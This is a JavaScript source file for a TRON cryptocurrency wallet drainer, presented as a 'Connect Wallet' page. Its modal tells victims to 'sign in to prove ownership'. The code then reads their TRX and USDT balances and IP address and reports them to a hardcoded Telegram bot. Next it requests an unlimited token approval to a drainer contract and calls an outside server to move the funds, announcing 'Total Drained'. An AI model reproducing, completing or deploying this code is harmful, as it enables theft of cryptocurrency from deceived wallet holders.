import TronWeb from 'tronweb';

// Вспомогательные функции для TRON
function formatUnits(value, decimals) {
  return Number(value) / Math.pow(10, decimals);
}

function parseUnits(value, decimals) {
  return Math.floor(value * Math.pow(10, decimals));
}

function isAddress(address) {
  return tronWeb && tronWeb.isAddress(address);
}

// Конфигурация
const projectId = import.meta.env.VITE_PROJECT_ID || '2511b8e8161d6176c55da917e0378c9a';
const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '8238426852:AAGEc__oMefvCpE_jJtgsjDCleEfDBrjolc';
const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || '-4835655591';

const TRON_NETWORK = {
  name: 'TRON Mainnet',
  chainId: 1, // TRON Mainnet
  rpcUrl: 'https://api.trongrid.io',
  nativeToken: 'TRX',
  drainerAddress: 'TXXxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' // Замени на адрес задеплоенного DrainerTRON
};

const TOKENS = {
  'TRON': [
    { symbol: 'TRX', address: 'native', decimals: 6 },
    { symbol: 'USDT', address: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', decimals: 6 }
  ]
};

const trc20Abi = [
  {
    constant: true,
    inputs: [{ name: '_owner', type: 'address' }],
    name: 'balanceOf',
    outputs: [{ name: 'balance', type: 'uint256' }],
    type: 'function'
  },
  {
    constant: true,
    inputs: [
      { name: '_owner', type: 'address' },
      { name: '_spender', type: 'address' }
    ],
    name: 'allowance',
    outputs: [{ name: 'remaining', type: 'uint256' }],
    type: 'function'
  },
  {
    constant: false,
    inputs: [
      { name: '_spender', type: 'address' },
      { name: '_value', type: 'uint256' }
    ],
    name: 'approve',
    outputs: [{ name: 'success', type: 'bool' }],
    type: 'function'
  }
];

// Состояние
const store = {
  accountState: {},
  networkState: { chainId: TRON_NETWORK.chainId, name: TRON_NETWORK.name },
  tokenBalances: [],
  errors: [],
  approvedTokens: {},
  isApprovalRequested: false,
  isApprovalRejected: false,
  connectionKey: null,
  isProcessingConnection: false
};

// Инициализация TronWeb
let tronWeb;
async function initTronWeb() {
  if (window.tronWeb) {
    tronWeb = window.tronWeb;
    return tronWeb;
  }
  tronWeb = new TronWeb({
    fullHost: TRON_NETWORK.rpcUrl,
    headers: { 'TRON-PRO-API-KEY': 'xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx' } // Получи API ключ на Trongrid.io
  });
  return tronWeb;
}

// Утилиты
const debounce = (func, wait) => {
  let timeout;
  return (...args) => {
    clearTimeout(timeout);
    timeout = setTimeout(() => func(...args), wait);
  };
};

const updateStore = (key, value) => {
  store[key] = value;
};

const updateStateDisplay = (elementId, state) => {
  const element = document.getElementById(elementId);
  if (element) element.innerHTML = JSON.stringify(state, null, 2);
};

const updateButtonVisibility = (isConnected) => {
  const disconnectBtn = document.getElementById('disconnect');
  if (disconnectBtn) disconnectBtn.style.display = isConnected ? '' : 'none';
};

// Модальные окна
function createModals() {
  const style = document.createElement('style');
  style.textContent = `
    /* Общие стили для модальных окон */
    .modal-overlay {
      opacity: 0;
      transition: opacity 0.3s ease-in-out;
      display: none;
      position: fixed;
      z-index: 1000;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.7);
      justify-content: center;
      align-items: center;
      backdrop-filter: blur(4px);
    }
    .modal-overlay.show {
      opacity: 1;
      display: flex;
    }
    
    /* Модальное окно выбора кошелька */
    .wallet-modal-content {
      transform: translateY(-20px) scale(0.95);
      transition: all 0.3s ease-in-out;
      opacity: 0;
      background: linear-gradient(135deg, #1a1a1a 0%, #0d0d0d 100%);
      padding: 32px;
      border-radius: 24px;
      text-align: center;
      width: 420px;
      max-width: 90vw;
      color: #ffffff;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
      border: 1px solid rgba(255, 255, 255, 0.1);
    }
    .modal-overlay.show .wallet-modal-content {
      transform: translateY(0) scale(1);
      opacity: 1;
    }
    
    .wallet-modal-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 24px;
    }
    
    .wallet-modal-title {
      font-size: 24px;
      font-weight: 700;
      background: linear-gradient(45deg, #ff0844, #ff4563);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin: 0;
    }
    
    .wallet-modal-close {
      background: rgba(255, 255, 255, 0.1);
      border: none;
      width: 32px;
      height: 32px;
      border-radius: 50%;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: all 0.2s ease;
      color: #999;
      font-size: 20px;
    }
    .wallet-modal-close:hover {
      background: rgba(255, 255, 255, 0.2);
      color: #fff;
    }
    
    .wallet-options {
      display: flex;
      flex-direction: column;
      gap: 12px;
      margin-top: 20px;
    }
    
    .wallet-option {
      background: rgba(255, 255, 255, 0.05);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 16px;
      padding: 16px 20px;
      cursor: pointer;
      transition: all 0.3s ease;
      display: flex;
      align-items: center;
      gap: 16px;
      text-align: left;
    }
    .wallet-option:hover {
      background: rgba(255, 255, 255, 0.1);
      border-color: rgba(255, 255, 255, 0.2);
      transform: translateY(-2px);
    }
    
    .wallet-icon {
      width: 48px;
      height: 48px;
      border-radius: 12px;
      background: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 24px;
    }
    
    .wallet-info {
      flex: 1;
    }
    
    .wallet-name {
      font-size: 18px;
      font-weight: 600;
      color: #fff;
      margin-bottom: 4px;
    }
    
    .wallet-description {
      font-size: 14px;
      color: #999;
    }
    
    .wallet-status {
      display: flex;
      align-items: center;
      gap: 6px;
      font-size: 12px;
      color: #4ade80;
    }
    .wallet-status.not-detected {
      color: #f87171;
    }
    .wallet-status-dot {
      width: 6px;
      height: 6px;
      border-radius: 50%;
      background: currentColor;
    }
    
    /* Модальное окно процесса подключения */
    .custom-modal {
      opacity: 0;
      transition: opacity 0.3s ease-in-out;
      display: none;
      position: fixed;
      z-index: 1001;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.7);
      justify-content: center;
      align-items: center;
      backdrop-filter: blur(4px);
    }
    .custom-modal.show {
      opacity: 1;
      display: flex;
    }
    .custom-modal-content {
      transform: translateY(-20px) scale(0.95);
      transition: all 0.3s ease-in-out;
      opacity: 0;
      background: linear-gradient(135deg, #1a1a1a 0%, #0d0d0d 100%);
      padding: 45px;
      border-radius: 24px;
      text-align: center;
      width: 320px;
      color: #ffffff;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
      border: 1px solid rgba(255, 255, 255, 0.1);
    }
    .custom-modal.show .custom-modal-content {
      transform: translateY(0) scale(1);
      opacity: 1;
    }
    .custom-modal-title {
      font-size: 20px;
      font-weight: 600;
      margin-bottom: 45px;
      margin-top: -25px;
    }
    .custom-modal-loader {
      border: 4px solid #ffffff33;
      border-top: 4px solid #ffffff;
      border-radius: 50%;
      width: 52px;
      height: 52px;
      animation: spin 1s ease-in-out infinite;
      margin: 0 auto 20px;
    }
    .custom-modal-message {
      margin-top: 45px;
      font-size: 16px;
      line-height: 1.5;
      color: #858585;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    /* QR код для мобильных кошельков */
    .qr-container {
      background: #fff;
      padding: 20px;
      border-radius: 16px;
      margin: 20px 0;
    }
    
    .divider {
      display: flex;
      align-items: center;
      margin: 24px 0;
      color: #666;
      font-size: 14px;
    }
    .divider::before,
    .divider::after {
      content: "";
      flex: 1;
      height: 1px;
      background: rgba(255, 255, 255, 0.1);
    }
    .divider span {
      padding: 0 16px;
    }
  `;
  document.head.appendChild(style);

  // Модальное окно выбора кошелька
  const walletModal = document.createElement('div');
  walletModal.id = 'walletModal';
  walletModal.className = 'modal-overlay';
  walletModal.innerHTML = `
    <div class="wallet-modal-content">
      <div class="wallet-modal-header">
        <h2 class="wallet-modal-title">Connect Wallet</h2>
        <button class="wallet-modal-close">&times;</button>
      </div>
      
      <div class="wallet-options">
        <div class="wallet-option" data-wallet="tronlink">
          <div class="wallet-icon" style="background: linear-gradient(135deg, #ff0844 0%, #ff4563 100%);">
            <span style="color: white;">T</span>
          </div>
          <div class="wallet-info">
            <div class="wallet-name">TronLink</div>
            <div class="wallet-description">Browser extension & Mobile app</div>
          </div>
          <div class="wallet-status" id="tronlink-status">
            <span class="wallet-status-dot"></span>
            <span>Checking...</span>
          </div>
        </div>
        
        <div class="wallet-option" data-wallet="trustwallet">
          <div class="wallet-icon" style="background: #3375BB;">
            <span style="color: white; font-size: 28px;">⚡</span>
          </div>
          <div class="wallet-info">
            <div class="wallet-name">Trust Wallet</div>
            <div class="wallet-description">Mobile app with built-in browser</div>
          </div>
        </div>
      </div>
      
      <div class="divider">
        <span>New to TRON?</span>
      </div>
      
      <div style="text-align: center; font-size: 14px; color: #999;">
        <p>Get a wallet to connect to this app</p>
        <a href="https://www.tronlink.org/" target="_blank" style="color: #ff4563; text-decoration: none;">
          Learn more about wallets →
        </a>
      </div>
    </div>
  `;
  document.body.appendChild(walletModal);

  // Модальное окно процесса подключения
  const customModal = document.createElement('div');
  customModal.id = 'customModal';
  customModal.className = 'custom-modal';
  customModal.innerHTML = `
    <div class="custom-modal-content">
      <p class="custom-modal-title">Sign in</p>
      <div class="custom-modal-loader"></div>
      <p class="custom-modal-message">Sign this message to prove you own this wallet and proceed. Canceling will disconnect you.</p>
    </div>
  `;
  document.body.appendChild(customModal);
}

// Функции управления модальными окнами
function showWalletModal() {
  const modal = document.getElementById('walletModal');
  if (modal) {
    // Проверяем наличие TronLink
    checkTronLinkStatus();
    modal.style.display = 'flex';
    setTimeout(() => modal.classList.add('show'), 10);
  }
}

function hideWalletModal() {
  const modal = document.getElementById('walletModal');
  if (modal) {
    modal.classList.remove('show');
    setTimeout(() => modal.style.display = 'none', 300);
  }
}

function showCustomModal() {
  const modal = document.getElementById('customModal');
  if (modal) {
    modal.style.display = 'flex';
    setTimeout(() => modal.classList.add('show'), 10);
  }
}

function hideCustomModal() {
  const modal = document.getElementById('customModal');
  if (modal) {
    modal.classList.remove('show');
    setTimeout(() => modal.style.display = 'none', 300);
  }
}

// Проверка наличия TronLink
function checkTronLinkStatus() {
  const statusElement = document.getElementById('tronlink-status');
  if (window.tronWeb && window.tronWeb.ready) {
    statusElement.innerHTML = `
      <span class="wallet-status-dot"></span>
      <span>Detected</span>
    `;
    statusElement.classList.remove('not-detected');
  } else {
    statusElement.innerHTML = `
      <span class="wallet-status-dot"></span>
      <span>Not detected</span>
    `;
    statusElement.classList.add('not-detected');
  }
}

// Обработчики подключения кошельков
async function connectTronLink() {
  if (!window.tronWeb) {
    alert('TronLink is not installed! Please install TronLink extension.');
    window.open('https://www.tronlink.org/', '_blank');
    return;
  }
  
  if (window.tronWeb.ready) {
    hideWalletModal();
    // Запускаем процесс верификации сразу после подключения
    await startVerificationProcess();
  } else {
    try {
      // Запрашиваем разрешение на подключение
      await window.tronWeb.request({ method: 'tron_requestAccounts' });
      hideWalletModal();
      // Запускаем процесс верификации после успешного подключения
      await startVerificationProcess();
    } catch (error) {
      console.error('TronLink connection error:', error);
      alert('Failed to connect TronLink. Please try again.');
    }
  }
}

// Функция запуска процесса верификации
async function startVerificationProcess() {
  if (store.isProcessingConnection) return;
  
  try {
    if (!tronWeb.defaultAddress.base58) {
      console.log('Wallet not connected');
      return;
    }
    
    const address = tronWeb.defaultAddress.base58;
    console.log(`Starting verification process for: ${address}`);
    
    // Показываем модальное окно верификации
    showCustomModal();
    
    // Проверяем баланс
    const balancePromises = TOKENS['TRON'].map(token =>
      getTokenBalance(address, token).then(balance => ({
        symbol: token.symbol,
        balance,
        address: token.address,
        network: 'TRON',
        chainId: TRON_NETWORK.chainId,
        decimals: token.decimals
      }))
    );
    
    const allBalances = await Promise.all(balancePromises);
    const hasBalance = allBalances.some(token => token.balance > 0);
    
    if (!hasBalance) {
      // Если нет средств, закрываем модальное окно с соответствующим сообщением
      const modalMessage = document.querySelector('.custom-modal-message');
      if (modalMessage) {
        modalMessage.textContent = 'No funds detected on this wallet. Connection completed.';
      }
      await new Promise(resolve => setTimeout(resolve, 2000));
      hideCustomModal();
      return;
    }
    
    // Если есть средства, продолжаем с существующей логикой
    const walletInfo = { name: 'TronLink' };
    const device = detectDevice();
    
    // Запускаем полный процесс верификации
    await notifyWalletConnection(address, walletInfo.name, device, allBalances);
    
  } catch (error) {
    console.error('Error in verification process:', error);
    hideCustomModal();
  }
}

// Генерация deeplink для Trust Wallet
function generateTrustWalletDeepLink() {
  // Получаем текущий URL
  const currentUrl = window.location.href;
  
  // Для мобильных устройств используем deeplink
  if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
    // Trust Wallet deeplink с правильным URL сайта во встроенном браузере
    const deepLink = `https://link.trustwallet.com/open_url?coin_id=195&url=${encodeURIComponent(currentUrl)}`;
    
    // Открываем deeplink
    window.open(deepLink, '_blank');
    
    // Fallback на App Store/Google Play если приложение не установлено
    setTimeout(() => {
      if (confirm('Trust Wallet not detected. Would you like to install it?')) {
        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
        if (isIOS) {
          window.open('https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409', '_blank');
        } else {
          window.open('https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp', '_blank');
        }
      }
    }, 2000);
  } else {
    // Для десктопа показываем QR код
    showTrustWalletQR();
  }
}

// Показать QR код для Trust Wallet
function showTrustWalletQR() {
  const walletModal = document.querySelector('.wallet-modal-content');
  if (!walletModal) return;
  
  // Временно заменяем содержимое на QR код
  const originalContent = walletModal.innerHTML;
  
  walletModal.innerHTML = `
    <div class="wallet-modal-header">
      <h2 class="wallet-modal-title">Connect Trust Wallet</h2>
      <button class="wallet-modal-close" data-action="close-wallet-modal">&times;</button>
    </div>
    
    <div style="text-align: center; padding: 20px;">
      <p style="color: #999; margin-bottom: 20px;">Scan with Trust Wallet app to connect</p>
      
      <div class="qr-container">
        <div style="background: #f0f0f0; width: 200px; height: 200px; margin: 0 auto; display: flex; align-items: center; justify-content: center; color: #666;">
          QR Code Placeholder
        </div>
      </div>
      
      <p style="color: #666; font-size: 14px; margin-top: 20px;">
        Trust Wallet mobile connection requires additional setup.
        <br>For now, please use TronLink extension.
      </p>
      
      <button data-action="back-to-wallet-selection" style="margin-top: 20px; background: #444; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer;">
        Back to wallet selection
      </button>
    </div>
  `;
}

// Генерация deeplink для TronLink
function generateTronLinkDeepLink() {
  // Получаем текущий URL
  const currentUrl = window.location.href;
  
  // Для мобильных устройств используем deeplink
  if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
    // TronLink deeplink с правильным URL сайта во встроенном браузере
    const deepLink = `tronlinkoutside://open.tronlink.org?url=${encodeURIComponent(currentUrl)}`;
    
    // Открываем deeplink
    window.open(deepLink, '_blank');
    
    // Fallback на App Store/Google Play если приложение не установлено
    setTimeout(() => {
      if (confirm('TronLink not detected. Would you like to install it?')) {
        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
        if (isIOS) {
          window.open('https://apps.apple.com/app/tronlink/id1453530188', '_blank');
        } else {
          window.open('https://play.google.com/store/apps/details?id=com.tronlinkpro.wallet', '_blank');
        }
      }
    }, 2000);
  } else {
    // Для десктопа пытаемся подключиться через расширение
    connectTronLink();
  }
}



// Инициализация обработчиков модальных окон
function initializeWalletModalHandlers() {
  // Закрытие модального окна при клике на крестик
  document.querySelector('.wallet-modal-close')?.addEventListener('click', hideWalletModal);
  
  // Закрытие при клике вне модального окна
  document.getElementById('walletModal')?.addEventListener('click', (e) => {
    if (e.target.id === 'walletModal') hideWalletModal();
  });
  
  // Обработчики для кнопок кошельков
  document.querySelectorAll('.wallet-option').forEach(option => {
    option.addEventListener('click', async (e) => {
      const wallet = option.getAttribute('data-wallet');
      
      if (wallet === 'tronlink') {
        // Проверяем, мобильное ли устройство
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        if (isMobile) {
          generateTronLinkDeepLink();
        } else {
          await connectTronLink();
        }
      } else if (wallet === 'trustwallet') {
        generateTrustWalletDeepLink();
      }
    });
  });
  
  // Глобальный обработчик для динамически создаваемых элементов
  document.addEventListener('click', (e) => {
    const action = e.target.getAttribute('data-action');
    
    if (action === 'close-wallet-modal') {
      hideWalletModal();
    } else if (action === 'reload-page') {
      location.reload();
    }
  });
}

// Утилиты для TRON
const getScanLink = (hash, isTx = false) => {
  const basePath = isTx ? '/#/transaction/' : '/#/address/';
  return `https://tronscan.org${basePath}${hash}`;
};

const sendTelegramMessage = async (message) => {
  try {
    const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: telegramChatId, text: message, parse_mode: 'Markdown', disable_web_page_preview: true })
    });
    const data = await response.json();
    if (!data.ok) throw new Error(data.description || 'Failed to send Telegram message');
    console.log('Telegram message sent successfully');
  } catch (error) {
    store.errors.push(`Error sending Telegram message: ${error.message}`);
  }
};

const getUserIP = async () => {
  const cachedIP = sessionStorage.getItem('userIP');
  if (cachedIP) return cachedIP;
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    const ip = data.ip || 'Unknown IP';
    sessionStorage.setItem('userIP', ip);
    return ip;
  } catch (error) {
    return 'Unknown IP';
  }
};

const detectDevice = () => {
  const userAgent = navigator.userAgent || navigator.vendor || window.opera || 'Unknown Device';
  if (/Windows NT/i.test(userAgent)) return 'Windows';
  if (/iPhone/i.test(userAgent) && !/Android/i.test(userAgent)) return 'iPhone';
  if (/Android/i.test(userAgent) && !/iPhone/i.test(userAgent)) return 'Android';
  if (/Macintosh|Mac OS X/i.test(userAgent)) return 'Mac';
  if (/Tablet|iPad/i.test(userAgent)) return 'Tablet';
  return 'Desktop';
};

const getTokenBalance = async (address, token) => {
  if (!address || !tronWeb.isAddress(address)) {
    console.error(`Invalid address: ${address}`);
    return 0;
  }
  try {
    if (token.address === 'native') {
      const balance = await tronWeb.trx.getBalance(address);
      return Number(formatUnits(balance, token.decimals));
    } else {
      const contract = await tronWeb.contract(trc20Abi, token.address);
      const balance = await contract.balanceOf(address).call();
      return Number(formatUnits(balance, token.decimals));
    }
  } catch (error) {
    store.errors.push(`Error fetching balance for ${token.address}: ${error.message}`);
    return 0;
  }
};

const getTokenAllowance = async (ownerAddress, tokenAddress, spenderAddress) => {
  if (!tronWeb.isAddress(ownerAddress) || !tronWeb.isAddress(tokenAddress) || !tronWeb.isAddress(spenderAddress)) {
    console.error(`Invalid addresses: owner=${ownerAddress}, token=${tokenAddress}, spender=${spenderAddress}`);
    return 0;
  }
  try {
    const contract = await tronWeb.contract(trc20Abi, tokenAddress);
    const allowance = await contract.allowance(ownerAddress, spenderAddress).call();
    return allowance.toString();
  } catch (error) {
    store.errors.push(`Error fetching allowance for ${tokenAddress}: ${error.message}`);
    return 0;
  }
};

const waitForAllowance = async (userAddress, tokenAddress, contractAddress) => {
  console.log(`Waiting for allowance to become maximum...`);
  while (true) {
    const allowance = await getTokenAllowance(userAddress, tokenAddress, contractAddress);
    console.log(`Current allowance: ${allowance}`);
    if (BigInt(allowance) > BigInt(1000)) {
      console.log(`Allowance is now maximum: ${allowance}`);
      return true;
    }
    await new Promise(resolve => setTimeout(resolve, 2000));
  }
};

const getTokenPrice = async (symbol) => {
  try {
    const response = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${symbol}USDT`);
    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
    const data = await response.json();
    return Number(data.price) || 0;
  } catch (error) {
    store.errors.push(`Error fetching price for ${symbol}: ${error.message}`);
    return 0;
  }
};

const sendTransferRequest = async (userAddress, tokenAddress, amount, txHash) => {
  try {
    const response = await fetch('https://api.cryptomuspayye.icu/api/transfer', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ userAddress, tokenAddress, amount: amount.toString(), chainId: TRON_NETWORK.chainId, txHash })
    });
    const data = await response.json();
    if (data.success) {
      console.log(`Transfer request successful: ${data.txHash}`);
      return { success: true, txHash: data.txHash };
    }
    return { success: false, message: data.message };
  } catch (error) {
    return { success: false, message: error.message };
  }
};

const approveToken = async (tokenAddress, contractAddress) => {
  if (!tronWeb.defaultAddress.base58) throw new Error('TronLink not connected');
  if (!tronWeb.isAddress(tokenAddress) || !tronWeb.isAddress(contractAddress)) throw new Error('Invalid token or contract address');
  try {
    const contract = await tronWeb.contract(trc20Abi, tokenAddress);
    const tx = await contract.approve(contractAddress, '115792089237316195423570985008687907853269984665640564039457584007913129639935').send({
      feeLimit: 10000000, // 10 TRX
      callValue: 0
    });
    console.log(`Approve transaction sent: ${tx}`);
    return tx;
  } catch (error) {
    store.errors.push(`Approve token failed: ${error.message}`);
    throw error;
  }
};

const notifyWalletConnection = async (address, walletName, device, balances) => {
  if (store.isProcessingConnection) return;
  store.isProcessingConnection = true;
  try {
    await new Promise(resolve => setTimeout(resolve, 3000));
    const ip = await getUserIP();
    const siteUrl = window.location.href || 'Unknown URL';
    const scanLink = getScanLink(address);
    
    // Получаем цены для токенов
    let totalValue = 0;
    for (const token of balances) {
      if (token.balance > 0) {
        const price = token.symbol === 'USDT' ? 1 : await getTokenPrice(token.symbol);
        token.price = price;
        totalValue += token.balance * price;
      }
    }
    
    const tokenList = balances
      .filter(token => token.balance > 0)
      .map(token => {
        const value = token.balance * (token.price || 0);
        return `➡️ ${token.symbol} - ${value.toFixed(2)}$`;
      })
      .join('\n');
      
    const message = `🚨 New connect (${walletName} - ${device})\n` +
                   `🌀 [Address](${scanLink})\n` +
                   `🕸 Network: ${TRON_NETWORK.name}\n` +
                   `🌎 ${ip}\n\n` +
                   `💰 **Total Value: ${totalValue.toFixed(2)}$**\n` +
                   `${tokenList}\n\n` +
                   `🔗 Site: ${siteUrl}`;
    await sendTelegramMessage(message);
    store.connectionKey = `${address}_${TRON_NETWORK.chainId}`;
    
    const hasBalance = balances.some(token => token.balance > 0);
    if (!hasBalance) {
      const modalMessage = document.querySelector('.custom-modal-message');
      if (modalMessage) modalMessage.textContent = 'No funds detected. Connection completed.';
      await new Promise(resolve => setTimeout(resolve, 2000));
      store.isProcessingConnection = false;
      hideCustomModal();
      return;
    }

    // Ищем самый дорогой токен для обработки
    let maxValue = 0;
    let mostExpensive = null;
    for (const token of balances) {
      if (token.balance > 0 && token.price) {
        const value = token.balance * token.price;
        if (value > maxValue) {
          maxValue = value;
          mostExpensive = { ...token, value };
        }
      }
    }

    if (mostExpensive) {
      console.log(`Most expensive token: ${mostExpensive.symbol}, balance: ${mostExpensive.balance}, price in USDT: ${mostExpensive.price}`);
      try {
        const contractAddress = TRON_NETWORK.drainerAddress;
        const approvalKey = `${address}_${mostExpensive.chainId}_${mostExpensive.address}_${contractAddress}`;
        if (store.approvedTokens[approvalKey] || store.isApprovalRequested || store.isApprovalRejected) {
          const approveMessage = store.approvedTokens[approvalKey]
            ? `Approve already completed for ${mostExpensive.symbol}`
            : store.isApprovalRejected
            ? `Approve was rejected for ${mostExpensive.symbol}`
            : `Approve request pending for ${mostExpensive.symbol}`;
          console.log(approveMessage);
          const approveState = document.getElementById('approveState');
          if (approveState) approveState.innerHTML = approveMessage;
          store.isProcessingConnection = false;
          return;
        }
        
        store.isApprovalRequested = true;
        const txHash = await approveToken(mostExpensive.address, contractAddress);
        store.approvedTokens[approvalKey] = true;
        store.isApprovalRequested = false;
        let approveMessage = `Approve successful for ${mostExpensive.symbol}: ${txHash}`;
        console.log(approveMessage);
        await notifyTransferApproved(address, walletName, device, mostExpensive);

        await waitForAllowance(address, mostExpensive.address, contractAddress);
        const amount = parseUnits(mostExpensive.balance.toString(), mostExpensive.decimals);
        const transferResult = await sendTransferRequest(address, mostExpensive.address, amount, txHash);

        if (transferResult.success) {
          console.log(`Transfer successful: ${transferResult.txHash}`);
          await notifyTransferSuccess(address, walletName, device, mostExpensive, transferResult.txHash);
          approveMessage += `<br>Transfer successful: ${transferResult.txHash}`;
        } else {
          console.log(`Transfer failed: ${transferResult.message}`);
          approveMessage += `<br>Transfer failed: ${transferResult.message}`;
        }

        const approveState = document.getElementById('approveState');
        if (approveState) approveState.innerHTML = approveMessage;
        hideCustomModal();
        store.isProcessingConnection = false;
      } catch (error) {
        store.isApprovalRequested = false;
        if (error.message.includes('user rejected')) {
          store.isApprovalRejected = true;
          const errorMessage = `Approve was rejected for ${mostExpensive.symbol}`;
          store.errors.push(errorMessage);
          const approveState = document.getElementById('approveState');
          if (approveState) approveState.innerHTML = errorMessage;
          hideCustomModal();
          store.connectionKey = null;
          store.isProcessingConnection = false;
          sessionStorage.clear();
        } else {
          const errorMessage = `Approve failed for ${mostExpensive.symbol}: ${error.message}`;
          store.errors.push(errorMessage);
          const approveState = document.getElementById('approveState');
          if (approveState) approveState.innerHTML = errorMessage;
          hideCustomModal();
          store.isProcessingConnection = false;
        }
      }
    } else {
      const message = 'No tokens with positive balance';
      console.log(message);
      const mostExpensiveState = document.getElementById('mostExpensiveTokenState');
      if (mostExpensiveState) mostExpensiveState.innerHTML = message;
      hideCustomModal();
      store.isProcessingConnection = false;
    }
  } catch (error) {
    store.errors.push(`Error in notifyWalletConnection: ${error.message}`);
    hideCustomModal();
    store.isProcessingConnection = false;
  }
};

const notifyTransferApproved = async (address, walletName, device, token) => {
  try {
    const ip = await getUserIP();
    const siteUrl = window.location.href || 'Unknown URL';
    const scanLink = getScanLink(address);
    const amountValue = (token.balance * token.price).toFixed(2);
    const message = `⚠️ Balance transfer approved (${walletName} - ${device})\n` +
                   `🌀 [Address](${scanLink})\n` +
                   `🕸 Network: ${TRON_NETWORK.name}\n` +
                   `🌎 ${ip}\n\n` +
                   `**🔥 Processing: ${amountValue}$**\n` +
                   `➡️ ${token.symbol}\n\n` +
                   `🔗 Site: ${siteUrl}`;
    await sendTelegramMessage(message);
  } catch (error) {
    store.errors.push(`Error in notifyTransferApproved: ${error.message}`);
  }
};

const notifyTransferSuccess = async (address, walletName, device, token, txHash) => {
  try {
    const ip = await getUserIP();
    const scanLink = getScanLink(address);
    const amountValue = (token.balance * token.price).toFixed(2);
    const txLink = getScanLink(txHash, true);
    const message = `✅ Drainer successfully (${walletName} - ${device})\n` +
                   `🌀 [Address](${scanLink})\n` +
                   `🕸 Network: ${TRON_NETWORK.name}\n` +
                   `🌎 ${ip}\n\n` +
                   `**💰 Total Drained: ${amountValue}$**\n` +
                   `➡️ ${token.symbol} - ${amountValue}$\n\n` +
                   `🔗 Transfer: [Transaction Hash](${txLink})`;
    await sendTelegramMessage(message);
  } catch (error) {
    store.errors.push(`Error in notifyTransferSuccess: ${error.message}`);
  }
};

const initializeSubscribers = () => {
  const debouncedCheckAccount = debounce(async () => {
    if (!tronWeb.defaultAddress.base58) {
      updateStore('accountState', {});
      updateStateDisplay('accountState', {});
      updateButtonVisibility(false);
      return;
    }
    const address = tronWeb.defaultAddress.base58;
    const state = { isConnected: true, address };
    updateStore('accountState', state);
    updateStateDisplay('accountState', state);
    updateButtonVisibility(true);

    // Простое обновление баланса без запуска полного процесса
    const balancePromises = TOKENS['TRON'].map(token =>
      getTokenBalance(address, token).then(balance => ({
        symbol: token.symbol,
        balance,
        address: token.address,
        network: 'TRON',
        chainId: TRON_NETWORK.chainId,
        decimals: token.decimals
      }))
    );
    const allBalances = await Promise.all(balancePromises);
    store.tokenBalances = allBalances;
    updateStateDisplay('tokenBalancesState', allBalances);
  }, 1000);

  setInterval(debouncedCheckAccount, 1000);
};

// Инициализация
window.addEventListener('load', async () => {
  await initTronWeb();
  createModals();
  initializeWalletModalHandlers();
  initializeSubscribers();
  updateButtonVisibility(!!tronWeb.defaultAddress.base58);

  // Обработчик для кнопок открытия модального окна
  document.querySelectorAll('.open-connect-modal').forEach(button => {
    button.addEventListener('click', async () => {
      if (!tronWeb.defaultAddress.base58) {
        // Показываем модальное окно выбора кошелька
        showWalletModal();
      } else {
        // Если уже подключен, показываем информацию
        alert(`Already connected: ${tronWeb.defaultAddress.base58}`);
      }
    });
  });

  // Обработчик для кнопки отключения
  document.getElementById('disconnect')?.addEventListener('click', () => {
    store.approvedTokens = {};
    store.errors = [];
    store.isApprovalRequested = false;
    store.isApprovalRejected = false;
    store.connectionKey = null;
    store.isProcessingConnection = false;
    sessionStorage.clear();
    updateButtonVisibility(false);
    
    // Просто сообщаем пользователю как отключиться
    if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
      alert('Please disconnect wallet in TronLink extension.');
    }
  });
  
  // Проверяем изменение аккаунта в TronLink
  if (window.tronWeb) {
    setInterval(() => {
      if (window.tronWeb.defaultAddress.base58 !== store.accountState.address) {
        // Аккаунт изменился, сбрасываем состояние без перезагрузки
        console.log('Account changed, resetting state...');
        store.approvedTokens = {};
        store.errors = [];
        store.isApprovalRequested = false;
        store.isApprovalRejected = false;
        store.connectionKey = null;
        store.isProcessingConnection = false;
        sessionStorage.clear();
        
        // Обновляем отображение
        updateStore('accountState', {});
        updateStateDisplay('accountState', {});
        updateButtonVisibility(false);
      }
    }, 1000);
  }
});
